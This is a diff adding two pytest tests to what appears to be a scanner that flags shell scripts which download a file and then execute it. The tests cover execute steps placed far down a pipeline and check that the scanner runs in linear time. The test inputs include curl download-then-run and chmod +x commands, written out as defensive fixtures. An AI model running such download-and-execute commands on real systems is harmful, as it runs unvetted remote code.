@@ -397,6 +397,23 @@ def test_download_run_by_a_nearby_pipe_stage_still_fires():
     assert run(**{"scripts/a.sh": "curl -L https://dl.example.com/tool -o tool | cat | ./tool\n"})
 
 
+def test_an_execute_step_far_along_a_pipeline_or_deep_in_the_next_command_still_fires():
+    # No position limit: the run step after twenty stages, and after twenty stages of the next command.
+    far = "curl -L https://dl.example.com/tool -o tool | " + "cat | " * 20 + "./tool"
+    assert run(**{"scripts/a.sh": far + "\n"})
+    deep = "curl -L https://dl.example.com/tool -o tool\ntrue " + "| cat " * 20 + "| chmod +x tool\n"
+    assert run(**{"scripts/b.sh": deep})
+
+
+def test_many_downloads_followed_by_one_large_command_are_read_in_linear_time():
+    # Review r1:F1: each download stage used to re-read the next command; now each command is read once.
+    downloads = "".join(f"curl -L https://dl.example.com/t{n} -o t{n} | " for n in range(5_000)) + "true"
+    large = "./" + "a" * 200_000 + " " + "b" * 100_000
+    started = time.perf_counter()
+    run(**{"scripts/a.sh": downloads + "\n" + large + "\n"})
+    assert time.perf_counter() - started < 1.0
+
+
 # --- fixtures ----------------------------------------------------------------------------------------
 
 def test_positive_fixture_fires_at_each_download_line():
